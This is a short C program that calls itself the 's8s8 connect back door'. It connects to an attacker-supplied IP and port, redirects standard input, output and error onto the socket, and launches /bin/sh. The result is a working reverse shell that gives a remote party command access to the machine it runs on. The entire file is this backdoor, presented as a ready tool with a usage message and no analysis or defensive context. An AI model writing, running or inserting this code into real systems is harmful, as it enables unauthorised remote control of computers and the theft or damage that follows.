#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>

void usage();
char shell[]="/bin/sh";
char message[]="s8s8 welcome\n";
int sock;
int main(int argc, char *argv[]) {
if(argc <3){
usage(argv[0]);
}

struct sockaddr_in server;
if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
printf("Couldn't make socket!\n"); exit(-1);
}

server.sin_family = AF_INET;
server.sin_port = htons(atoi(argv[2]));
server.sin_addr.s_addr = inet_addr(argv[1]);

if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
printf("Could not connect to remote shell!\n");
exit(-1);
}
send(sock, message, sizeof(message), 0);
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
execl(shell,"/bin/sh",(char *)0);
close(sock);
return 1;
}

void usage(char *prog[]) {
   printf("\t\ts8s8 connect back door\n\n");
printf("\t sql@s8s8.net\n\n");
printf("Usage: %s <reflect ip> <port>\n", prog);
exit(-1);
}